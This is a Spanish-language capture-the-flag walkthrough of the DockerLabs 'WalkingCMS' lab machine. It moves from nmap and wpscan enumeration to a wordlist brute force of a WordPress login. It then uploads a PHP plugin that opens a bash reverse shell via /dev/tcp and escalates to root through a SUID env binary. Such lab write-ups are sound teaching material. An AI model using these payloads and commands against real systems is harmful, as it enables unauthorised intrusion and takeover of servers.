#MAQUINA #DOCKERLABS #FACIL 
#WPSCAN 
<hr>

# RECONOCIMIENTO

Vamos a resolver **WalkingCMS** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 09:45 CET
Initiating ARP Ping Scan at 09:45
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 09:45, 0.07s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 09:45
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 09:45, 0.48s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2024-12-09 09:45:07 CET for 1s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 172.17.0.2                         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 09:45 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000026s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds



```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-09 09:46 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 2.06 seconds

whatweb "http://172.17.0.2/wordpress"
http://172.17.0.2/wordpress [301 Moved Permanently] Apache[2.4.57], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[172.17.0.2], RedirectLocation[http://172.17.0.2/wordpress/], Title[301 Moved Permanently]
http://172.17.0.2/wordpress/ [200 OK] Apache[2.4.57], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], IP[172.17.0.2], MetaGenerator[WordPress 6.7.1], Script[importmap,module], Title[Web Invulnerable], UncommonHeaders[link], WordPress[6.7.1]

```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:**  **wordpress**.
## HTTP (80)

Usamos **wpscan** :
   ```bash
wpscan --url "http://172.17.0.2/wordpress/" --enumerate u

```

**Usuario -> mario**

   ```bash
 wpscan --url "http://172.17.0.2/wordpress/" -U mario -P /usr/share/wordlists/rockyou.txt
 
```

**Usuario -> mario**
**Contrasena -> love**
# EXPLOTACION

Nos registramos como mario (http://172.17.0.2/wordpress/wp-login.php).

Nos vamos a plugins y subimos y activamos un plugin. Vamos a subir un zip que nos otorgue una reverse shell y nos ponemos en escucha por el puerto 443 (**nc -nlvp 443**).
Contenido del zip, un php con:

   ```bash

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

```

# ESCALADA PRIVILEGIOS

Vemos si el usuario tiene permisos SUID:
   ```bash
   
www-data@ece92b2a94e0:/$ find / -perm -4000 2>/dev/null
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/env


```

Vemos **env** con permisos SUID :
   ```bash
www-data@ece92b2a94e0:/$ /usr/bin/env /bin/sh -p
# whoami
root
# 

```

**YA ESTAMOS COMO ROOT.**
